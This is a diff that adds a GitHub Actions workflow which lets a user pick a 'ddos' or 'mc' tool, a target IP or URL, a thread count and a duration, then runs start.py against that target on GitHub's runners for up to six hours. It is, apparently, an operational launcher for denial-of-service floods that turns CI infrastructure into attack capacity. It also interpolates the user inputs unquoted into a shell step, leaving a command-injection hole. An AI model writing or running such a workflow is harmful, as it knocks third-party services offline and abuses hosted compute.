@@ -1,0 +1,43 @@
+name: Custom Runner
+
+on:
+  workflow_dispatch:
+    inputs:
+      tool:
+        description: 'Tool to use (mc | ddos)'
+        required: true
+        default: 'ddos'
+      target:
+        description: 'Target IP:Port or URL'
+        required: true
+      threads:
+        description: 'Threads (ddos only)'
+        required: false
+        default: '100'
+      duration:
+        description: 'Duration (seconds)'
+        required: true
+        default: '60'
+
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+
+    steps:
+    - name: Checkout Repo
+      uses: actions/checkout@v4
+
+    - name: Setup Python
+      uses: actions/setup-python@v5
+      with:
+        python-version: '3.10'
+
+    - name: Install Dependencies
+      run: |
+        python -m pip install --upgrade pip
+        pip install -r requirements.txt
+
+    - name: Execute
+      run: |
+        python start.py ${{ github.event.inputs.tool }} "${{ github.event.inputs.target }}" ${{ github.event.inputs.threads }} ${{ github.event.inputs.duration }}
